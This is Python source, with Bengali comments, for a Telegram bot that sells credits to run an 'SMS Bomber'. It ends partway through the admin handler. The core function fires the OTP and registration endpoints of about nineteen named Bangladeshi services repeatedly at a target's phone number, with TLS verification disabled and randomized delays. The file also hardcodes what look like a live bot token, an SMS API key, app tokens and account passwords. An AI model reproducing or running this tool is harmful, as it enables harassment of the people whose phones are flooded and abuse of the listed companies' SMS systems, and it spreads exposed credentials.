os
import asyncio
import logging
import aiosqlite
import aiohttp
import json
import random
import ssl
import csv
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# ===================== কনফিগারেশন =====================
BOT_TOKEN = "8826486988:AAFOOfdcrVCgvj532plzOQUXwx40yn3USl0"
ADMIN_ID = 1967494059
ADMIN_USERNAME = "RobiEntertainment"
OWNER_USERNAME = "RobiEntertainment"

# SMS API
SMS_API_URL = "https://api.paglahost.shop/Custom_SMS/api.php"
SMS_API_KEY = "Shuvo55356"

# ===================== ডাটাবেস পাথ =====================
DB_PATH = os.path.join(os.path.dirname(__file__), "bot_database.db")

# ===================== API লিমিট =====================
API_LIMITS = {
    "daily_limit": 1000,
    "per_user_limit": 50,
    "api_call_interval": 0.8,
    "max_retries": 3,
}

# ===================== কাজ করা API =====================
WORKING_APIS = [
    {"name": "Paperfly", "method": "POST", "url": "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", "body": {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"}},
    {"name": "OsudPotro", "method": "POST", "url": "https://api.osudpotro.com/api/v1/users/send_otp", "body": {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"}},
    {"name": "Bohubrihi", "method": "POST", "url": "https://bb-api.bohubrihi.com/public/activity/otp", "body": {"phone": "{phone}", "intent": "login"}},
    {"name": "Fundesh", "method": "POST", "url": "https://fundesh.com.bd/api/auth/generateOTP", "body": {"msisdn": "{phone}"}},
    {"name": "Jatri", "method": "POST", "url": "https://user-api.jslglobal.co/v2/send-otp", "body": {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}},
    {"name": "RedX", "method": "POST", "url": "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "body": {"mobile": "+88{phone}"}},
    {"name": "RabbitHoleBD", "method": "POST", "url": "https://apix.rabbitholebd.com/appv2/login/requestOTP", "body": {"mobile": "+88{phone}"}},
    {"name": "Qcoom", "method": "POST", "url": "https://auth.qcoom.com/api/v1/otp/send", "body": {"mobileNumber": "+88{phone}"}},
    {"name": "Training.gov.bd", "method": "POST", "url": "https://training.gov.bd/backoffice/api/user/sendOtp", "body": {"mobile": "{phone}"}},
    {"name": "Easy.com.bd", "method": "POST", "url": "https://core.easy.com.bd/api/v1/registration", "body": {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be"}},
    {"name": "Hoichoi", "method": "POST", "url": "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "body": {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": True, "whatsappConsent": True}},
    {"name": "Addatimes", "method": "POST", "url": "https://app.addatimes.com/api/login", "body": {"phone": "{phone}", "country_code": "BD"}},
    {"name": "DeeptoPlay", "method": "POST", "url": "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"}},
    {"name": "TimezoneBD", "method": "POST", "url": "https://backend.timezonebd.com/api/v1/user/otp-request", "body": {"phone": "{phone}"}},
    {"name": "Chorki", "method": "POST", "url": "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", "body": {"number": "+880{phone}"}},
    {"name": "Ghoori Learning", "method": "POST", "url": "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", "body": {"mobile_no": "{phone}"}},
    {"name": "Swap.com.bd", "method": "POST", "url": "https://api.swap.com.bd/api/v1/send-otp/v2", "body": {"phone": "{phone}"}},
    {"name": "BdTickets", "method": "POST", "url": "https://apiv1.bdtickets.com/api/v1/auth/otp/send", "body": {"phone": "+880{phone}"}},
    {"name": "Binge.buzz", "method": "POST", "url": "https://ss.binge.buzz/otp/send/login", "body": {"mobile": "{phone}"}},
]

# ===================== লগিং =====================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===================== ডাটাবেস =====================
async def init_db():
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            # ইউজার টেবিল
            await db.execute("""CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                balance INTEGER DEFAULT 10,
                total_sms INTEGER DEFAULT 0,
                total_bombing INTEGER DEFAULT 0,
                join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'active'
            )""")
            
            # রিডিম কোড টেবিল
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_codes (
                code TEXT PRIMARY KEY,
                amount INTEGER,
                usages INTEGER,
                created_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            
            # রিডিম হিস্ট্রি
            await db.execute("""CREATE TABLE IF NOT EXISTS redeem_history (
                user_id INTEGER,
                code TEXT,
                redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id, code)
            )""")
            
            # API ইউসেজ টেবিল
            await db.execute("""CREATE TABLE IF NOT EXISTS api_usage (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                api_name TEXT,
                user_id INTEGER,
                success INTEGER,
                usage_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            
            # API স্ট্যাটস টেবিল
            await db.execute("""CREATE TABLE IF NOT EXISTS api_stats (
                api_name TEXT PRIMARY KEY,
                total_calls INTEGER DEFAULT 0,
                total_success INTEGER DEFAULT 0,
                total_failed INTEGER DEFAULT 0,
                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            
            # ইউজার API স্ট্যাটস
            await db.execute("""CREATE TABLE IF NOT EXISTS user_api_stats (
                user_id INTEGER,
                api_name TEXT,
                total_calls INTEGER DEFAULT 0,
                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (user_id, api_name)
            )""")
            
            # লগ টেবিল
            await db.execute("""CREATE TABLE IF NOT EXISTS admin_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_id INTEGER,
                action TEXT,
                target_id INTEGER,
                details TEXT,
                log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )""")
            
            # ডেমো কোড
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('FREE50', 50, 100, ?)", (ADMIN_ID,))
            await db.execute("INSERT OR IGNORE INTO redeem_codes (code, amount, usages, created_by) VALUES ('WELCOME10', 10, 200, ?)", (ADMIN_ID,))
            
            await db.commit()
            logger.info("✅ Database initialized")
    except Exception as e:
        logger.error(f"Database error: {e}")

# ===================== হেল্পার ফাংশন =====================
def replace_phone(data, phone):
    if isinstance(data, dict):
        return {k: replace_phone(v, phone) for k, v in data.items()}
    elif isinstance(data, list):
        return [replace_phone(item, phone) for item in data]
    elif isinstance(data, str):
        return data.replace('{phone}', phone)
    return data

def check_success(text, status):
    if status in [200, 201, 202, 204]:
        success_keywords = ['success', 'otp', 'sent', 'ok', 'true', '1', 'verified', 'done']
        return any(word in text.lower() for word in success_keywords)
    return False

# ===================== API ট্র্যাকিং =====================
async def track_api_usage(api_name, user_id, success):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                """INSERT INTO api_stats (api_name, total_calls, total_success, total_failed) 
                   VALUES (?, 1, ?, ?) 
                   ON CONFLICT(api_name) DO UPDATE SET 
                   total_calls = total_calls + 1, 
                   total_success = total_success + ?, 
                   total_failed = total_failed + ?, 
                   last_used = CURRENT_TIMESTAMP""",
                (api_name, 1 if success else 0, 0 if success else 1,
                 1 if success else 0, 0 if success else 1)
            )
            
            await db.execute(
                """INSERT INTO user_api_stats (user_id, api_name, total_calls) 
                   VALUES (?, ?, 1) 
                   ON CONFLICT(user_id, api_name) DO UPDATE SET 
                   total_calls = total_calls + 1, 
                   last_used = CURRENT_TIMESTAMP""",
                (user_id, api_name)
            )
            
            await db.execute(
                "INSERT INTO api_usage (api_name, user_id, success) VALUES (?, ?, ?)",
                (api_name, user_id, 1 if success else 0)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"Track API error: {e}")

# ===================== অ্যাডমিন লগ =====================
async def admin_log(admin_id, action, target_id=None, details=""):
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)",
                (admin_id, action, target_id, details)
            )
            await db.commit()
    except Exception as e:
        logger.error(f"Admin log error: {e}")

# ===================== কীবোর্ড =====================
def get_main_keyboard():
    keyboard = [
        ["📨 Send SMS", "💣 SMS Bomber"],
        ["👤 My Profile", "🎁 Redeem Code"],
        ["📊 My Stats", "📞 Contact Admin"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_admin_keyboard():
    keyboard = [
        ["💰 Add Credit", "➖ Remove Credit"],
        ["🚫 Ban User", "✅ Unban User"],
        ["📣 Broadcast", "🎟️ Create Code"],
        ["📊 Live Stats", "📈 API Stats"],
        ["👥 Users List", "🏆 Top Users"],
        ["💰 Total Balance", "📋 API List"],
        ["🔄 Reset Limits", "📤 Export Data"],
        ["🗑️ Clear Logs", "📜 Admin Logs"],
        ["🔙 Back"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def get_back_keyboard():
    keyboard = [["🔙 Back"]]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ===================== স্টার্ট =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute(
            "INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)",
            (user_id, user.username or user.first_name)
        )
        await db.commit()
    
    if user_id == ADMIN_ID:
        await update.message.reply_text(
            f"👑 **Admin Panel**\n\n"
            f"Welcome Admin {user.first_name}!\n"
            f"🆔 ID: `{user_id}`\n\n"
            f"📌 Select an option:",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
        return
    
    await update.message.reply_text(
        f"🔥 **Welcome {user.first_name}!**\n\n"
        f"🆔 ID: `{user_id}`\n"
        f"💰 Balance: 10 Credits\n"
        f"📡 APIs: {len(WORKING_APIS)}\n\n"
        f"📌 **Select an option:**",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )

# ===================== GET TOTAL SMS =====================
async def get_total_sms(user_id):
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT total_sms FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            return row[0] if row else 0

# ===================== SEND SMS =====================
async def cmd_sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
            row = await cur.fetchone()
            if not row or row[0] < 1:
                await update.message.reply_text(
                    f"❌ **Insufficient credits!**\n"
                    f"💰 Balance: {row[0] if row else 0}\n"
                    f"👨‍💻 Contact: @{ADMIN_USERNAME}",
                    parse_mode="Markdown",
                    reply_markup=get_main_keyboard()
                )
                return
    
    await update.message.reply_text(
        "📨 **Send SMS**\n\n"
        "Enter phone number:\n"
        "Example: `018XXXXXXXX`\n"
        "💰 Cost: 1 Credit",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'sms_number'

async def sms_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text(
            "❌ Invalid number!\nEnter 11 digits:",
            reply_markup=get_back_keyboard()
        )
        return
    
    context.user_data['sms_number'] = number
    context.user_data['state'] = 'sms_message'
    
    await update.message.reply_text(
        f"✅ Number: `{number}`\n\n"
        f"💬 **Enter your message:**",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def sms_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    number = context.user_data.get('sms_number')
    msg_text = update.message.text
    
    if not number:
        await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    await update.message.reply_text(f"⏳ Sending SMS to `{number}`...", parse_mode="Markdown")
    
    success = False
    response_text = ""
    
    try:
        params = {"key": SMS_API_KEY, "number": number, "msg": msg_text}
        async with aiohttp.ClientSession() as session:
            async with session.get(SMS_API_URL, params=params, timeout=30) as resp:
                response_text = await resp.text()
                try:
                    data = await resp.json()
                    if data.get("status") == "success":
                        success = True
                except:
                    if "success" in response_text.lower():
                        success = True
    except Exception as e:
        response_text = str(e)
        logger.error(f"SMS error: {e}")
    
    if success:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,)) as cur:
                row = await cur.fetchone()
                if row and row[0] > 0:
                    await db.execute("UPDATE users SET balance = balance - 1 WHERE user_id = ?", (user_id,))
                    await db.execute("UPDATE users SET total_sms = total_sms + 1 WHERE user_id = ?", (user_id,))
                    await db.commit()
                else:
                    await update.message.reply_text("❌ Insufficient credits!", reply_markup=get_main_keyboard())
                    context.user_data.clear()
                    return
        
        await update.message.reply_text(
            f"✅ **SMS Sent Successfully!**\n\n"
            f"📱 Number: `{number}`\n"
            f"💰 1 Credit deducted\n"
            f"📨 Total Sent: {await get_total_sms(user_id)}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    else:
        await update.message.reply_text(
            f"❌ **Failed to send SMS!**\n\n"
            f"📱 Number: `{number}`\n"
            f"⚠️ Error: `{response_text[:100]}`",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )
    
    context.user_data.clear()

# ===================== SMS BOMBER =====================
async def cmd_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "💣 **SMS Bomber**\n\n"
        "Enter target number:\n"
        "Example: `018XXXXXXXX`\n"
        f"📡 APIs: {len(WORKING_APIS)}\n"
        "⚠️ Max 20 per API",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'bomber_number'

async def bomber_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text(
            "❌ Invalid number!\nEnter 11 digits:",
            reply_markup=get_back_keyboard()
        )
        return
    
    context.user_data['bomber_number'] = number
    context.user_data['state'] = 'bomber_amount'
    
    await update.message.reply_text(
        f"✅ Number: `{number}`\n\n"
        f"💥 **Enter amount (1-20 per API):**\n"
        f"📊 Total: {len(WORKING_APIS)} x amount",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )

async def bomber_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    number = context.user_data.get('bomber_number')
    
    try:
        amount = int(update.message.text.strip())
        if amount < 1 or amount > 20:
            await update.message.reply_text("❌ Amount must be 1-20!", reply_markup=get_back_keyboard())
            return
    except ValueError:
        await update.message.reply_text("❌ Enter a valid number!", reply_markup=get_back_keyboard())
        return
    
    if not number:
        await update.message.reply_text("❌ Error! Start again.", reply_markup=get_main_keyboard())
        context.user_data.clear()
        return
    
    total_apis = len(WORKING_APIS)
    total_sms = total_apis * amount
    
    msg = await update.message.reply_text(
        f"⏳ **Bombing Started!**\n\n"
        f"📱 Target: `{number}`\n"
        f"📡 APIs: {total_apis}\n"
        f"💥 Per API: {amount}\n"
        f"📊 Total: {total_sms}\n"
        f"⏰ Please wait...",
        parse_mode="Markdown"
    )
    
    success_count = 0
    failed_count = 0
    api_results = []
    
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_context)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        for i, api in enumerate(WORKING_APIS, 1):
            api_success = 0
            api_failed = 0
            
            for j in range(amount):
                try:
                    body = replace_phone(api['body'], number)
                    
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Accept-Encoding": "gzip, deflate, br",
                        "Connection": "keep-alive"
                    }
                    
                    await asyncio.sleep(random.uniform(0.8, 1.5))
                    
                    if api['method'] == 'POST':
                        async with session.post(api['url'], json=body, headers=headers, timeout=15) as resp:
                            status = resp.status
                            text = await resp.text()
                            
                            if check_success(text, status):
                                api_success += 1
                                success_count += 1
                            else:
                                api_failed += 1
                                failed_count += 1
                    else:
                        async with session.get(api['url'], headers=headers, timeout=15) as resp:
                            if resp.status in [200, 201, 202, 204]:
                                api_success += 1
                                success_count += 1
                            else:
                                api_failed += 1
                                failed_count += 1
                                
                except asyncio.TimeoutError:
                    api_failed += 1
                    failed_count += 1
                except Exception as e:
                    api_failed += 1
                    failed_count += 1
                    logger.error(f"API error {api['name']}: {e}")
                
                if j == amount - 1:
                    await track_api_usage(api['name'], user_id, api_success > 0)
                
                total_done = (i-1) * amount + (j+1)
                if total_done % 10 == 0 or total_done == total_sms:
                    try:
                        await msg.edit_text(
                            f"⏳ **Bombing...**\n\n"
                            f"📱 Target: `{number}`\n"
                            f"✅ Success: {success_count}\n"
                            f"❌ Failed: {failed_count}\n"
                            f"📊 Progress: {total_done}/{total_sms}",
                            parse_mode="Markdown"
                        )
                    except:
                        pass
            
            api_results.append({'name': api['name'], 'success': api_success, 'failed': api_failed})
    
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("UPDATE users SET total_bombing = total_bombing + 1 WHERE user_id = ?", (user_id,))
        await db.commit()
    
    success_rate = round((success_count / total_sms) * 100, 2) if total_sms > 0 else 0
    
    top_apis = sorted(api_results, key=lambda x: x['success'], reverse=True)[:10]
    top_apis_text = ""
    for idx, api in enumerate(top_apis, 1):
        if api['success'] > 0:
            top_apis_text += f"{idx}. {api['name']}: ✅{api['success']}\n"
    
    if not top_apis_text:
        top_apis_text = "❌ No successful APIs!"
    
    result_message = (
        f"✅ **Bombing Complete!**\n\n"
        f"📱 Target: `{number}`\n"
        f"📡 APIs Used: {total_apis}\n"
        f"💥 Total Sent: {total_sms}\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {failed_count}\n"
        f"📊 Success Rate: {success_rate}%\n\n"
        f"🏆 **Top 10 APIs:**\n{top_apis_text}"
    )
    
    await msg.edit_text(result_message, parse_mode="Markdown", reply_markup=get_main_keyboard())
    context.user_data.clear()

# ===================== প্রোফাইল =====================
async def profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT username, balance, total_sms, total_bombing, join_date, status FROM users WHERE user_id = ?",
            (user_id,)
        ) as cur:
            row = await cur.fetchone()
    
    if row:
        await update.message.reply_text(
            f"👤 **My Profile**\n\n"
            f"🆔 ID: `{user_id}`\n"
            f"👤 Username: {row[0] or 'N/A'}\n"
            f"💰 Balance: {row[1]}\n"
            f"📨 SMS Sent: {row[2]}\n"
            f"💣 Bombing Done: {row[3]}\n"
            f"🚦 Status: {row[5].capitalize()}\n"
            f"📅 Joined: {row[4][:10] if row[4] else 'N/A'}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

# ===================== স্ট্যাটস =====================
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT balance, total_sms, total_bombing FROM users WHERE user_id = ?",
            (user_id,)
        ) as cur:
            row = await cur.fetchone()
    
    if row:
        await update.message.reply_text(
            f"📊 **My Stats**\n\n"
            f"💰 Balance: {row[0]}\n"
            f"📨 SMS Sent: {row[1]}\n"
            f"💣 Bombing Done: {row[2]}\n"
            f"📡 Total APIs: {len(WORKING_APIS)}",
            parse_mode="Markdown",
            reply_markup=get_main_keyboard()
        )

# ===================== রিডিম =====================
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎟 **Enter Redeem Code:**\n\n"
        "Available: `FREE50`, `WELCOME10`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['state'] = 'redeem_code'

async def redeem_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.strip().upper()
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT 1 FROM redeem_history WHERE user_id = ? AND code = ?", (user_id, code)) as cur:
            if await cur.fetchone():
                await update.message.reply_text("❌ You already used this code!", reply_markup=get_main_keyboard())
                context.user_data.clear()
                return
        
        async with db.execute("SELECT amount, usages FROM redeem_codes WHERE code = ?", (code,)) as cur:
            row = await cur.fetchone()
            if not row or row[1] <= 0:
                await update.message.reply_text("❌ Invalid or expired code!", reply_markup=get_main_keyboard())
                context.user_data.clear()
                return
            
            amount = row[0]
            await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
            await db.execute("UPDATE redeem_codes SET usages = usages - 1 WHERE code = ?", (code,))
            await db.execute("INSERT INTO redeem_history (user_id, code) VALUES (?, ?)", (user_id, code))
            await db.commit()
    
    await update.message.reply_text(
        f"🎉 **Code Redeemed!**\n✅ +{amount} Credits!",
        parse_mode="Markdown",
        reply_markup=get_main_keyboard()
    )
    context.user_data.clear()

# ===================== কন্টাক্ট =====================
async def contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📩 Message Admin", url=f"https://t.me/{ADMIN_USERNAME}")],
        [InlineKeyboardButton("📢 Support", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"📞 **Contact**\n\n"
        f"👨‍💻 Admin: @{ADMIN_USERNAME}\n"
        f"👨‍💻 Owner: @{OWNER_USERNAME}\n\n"
        f"📌 Click the button below:",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

# ===================== অ্যাডমিন ফাংশন =====================
async def admin_add_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    await update.message.reply_text(
        "💰 **Add Credit**\n\n"
        "Enter user ID and amount:\n"
        "Example: `1967494059 50`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'add_credit'

async def admin_remove_credit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    await update.message.reply_text(
        "➖ **Remove Credit**\n\n"
        "Enter user ID and amount:\n"
        "Example: `1967494059 20`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'remove_credit'

async def admin_ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    await update.message.reply_text(
        "🚫 **Ban User**\n\n"
        "Enter user ID to ban:\n"
        "Example: `1967494059`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'ban_user'

async def admin_unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    await update.message.reply_text(
        "✅ **Unban User**\n\n"
        "Enter user ID to unban:\n"
        "Example: `1967494059`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'unban_user'

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    await update.message.reply_text(
        "📣 **Broadcast**\n\n"
        "Send your broadcast message:",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'broadcast'

async def admin_create_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    await update.message.reply_text(
        "🎟️ **Create Redeem Code**\n\n"
        "Enter code details:\n"
        "Format: `CODE AMOUNT USAGES`\n"
        "Example: `BONUS25 25 50`",
        parse_mode="Markdown",
        reply_markup=get_back_keyboard()
    )
    context.user_data['admin_state'] = 'create_code'

async def admin_total_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute("SELECT SUM(balance) FROM users") as cur:
            total = await cur.fetchone()
        async with db.execute("SELECT COUNT(*) FROM users") as cur:
            users = await cur.fetchone()
        async with db.execute("SELECT AVG(balance) FROM users") as cur:
            avg = await cur.fetchone()
    
    await update.message.reply_text(
        f"💰 **Total Balance**\n\n"
        f"👥 Total Users: {users[0]}\n"
        f"💰 Total Balance: {total[0] or 0}\n"
        f"📊 Average Balance: {round(avg[0] or 0, 2)}\n\n"
        f"📌 Use 'Add Credit' to increase balances!",
        parse_mode="Markdown",
        reply_markup=get_admin_keyboard()
    )

async def admin_top_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT user_id, username, balance, total_sms, total_bombing FROM users ORDER BY balance DESC LIMIT 10"
        ) as cur:
            users = await cur.fetchall()
    
    if not users:
        await update.message.reply_text("No users found!", reply_markup=get_admin_keyboard())
        return
    
    response = "🏆 **Top 10 Users (by Balance)**\n\n"
    for i, user in enumerate(users, 1):
        response += f"{i}. ID: `{user[0]}` - 💰{user[2]}\n"
        response += f"   📨SMS:{user[3]} 💣Bomb:{user[4]}\n\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

async def admin_export_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    await update.message.reply_text("⏳ Exporting data...")
    
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            async with db.execute("SELECT * FROM users") as cur:
                users = await cur.fetchall()
        
        # CSV ফাইল তৈরি
        csv_file = f"users_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        with open(csv_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(['ID', 'Username', 'Balance', 'Total SMS', 'Total Bombing', 'Join Date', 'Status'])
            writer.writerows(users)
        
        await update.message.reply_document(
            document=open(csv_file, 'rb'),
            caption=f"📤 **Users Data Export**\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
        
        os.remove(csv_file)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Export failed: {str(e)}", reply_markup=get_admin_keyboard())

async def admin_reset_limits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    # API লিমিট রিসেট
    global API_LIMITS
    API_LIMITS = {
        "daily_limit": 1000,
        "per_user_limit": 50,
        "api_call_interval": 0.8,
        "max_retries": 3,
    }
    
    await update.message.reply_text(
        "🔄 **API Limits Reset!**\n\n"
        "✅ Daily Limit: 1000\n"
        "✅ Per User: 50\n"
        "✅ Interval: 0.8s\n"
        "✅ Max Retries: 3",
        parse_mode="Markdown",
        reply_markup=get_admin_keyboard()
    )

async def admin_clear_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    try:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("DELETE FROM admin_logs")
            await db.commit()
        
        await update.message.reply_text(
            "🗑️ **Logs Cleared!**\n\n"
            "All admin logs have been deleted.",
            parse_mode="Markdown",
            reply_markup=get_admin_keyboard()
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_admin_keyboard())

async def admin_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    
    async with aiosqlite.connect(DB_PATH) as db:
        async with db.execute(
            "SELECT admin_id, action, target_id, details, log_time FROM admin_logs ORDER BY log_time DESC LIMIT 20"
        ) as cur:
            logs = await cur.fetchall()
    
    if not logs:
        await update.message.reply_text("📜 No logs found!", reply_markup=get_admin_keyboard())
        return
    
    response = "📜 **Admin Logs**\n\n"
    for log in logs:
        response += f"🕐 {log[4][:16]}\n"
        response += f"   📌 {log[1]}\n"
        if log[2]:
            response += f"   👤 Target: {log[2]}\n"
        if log[3]:
            response += f"   📝 {log[3]}\n"
        response += "\n"
    
    await update.message.reply_text(response, parse_mode="Markdown", reply_markup=get_admin_keyboard())

# ===================== অ্যাডমিন স্টেট প্রসেসর =====================
async def admin_state_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    message = update.message.text
    state = context.user_data.get('admin_state')
    
    if state == 'add_credit':
        try:
            parts = message.split()
            target_id = int(parts[0])
            amount = int(parts[1])
            
            async with aiosqlite.connect(DB_PATH) as db:
                await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_id))
                await db.commit()
            
            await admin_log(user_id, "Added Credit", target_id, f"{amount} credits")
            await update.message.reply_text(f"✅ Added {amount} credits to {target_id}!", reply_markup=get_admin_keyboard())
            context.user_data['admin_state'] = None
        except:
            await update.message.reply_text("❌ Invalid format! Use: `ID AMOUNT`", parse_mode="Markdown")
    
    elif state == 'remove_credit':
        try:
            parts = message.split()
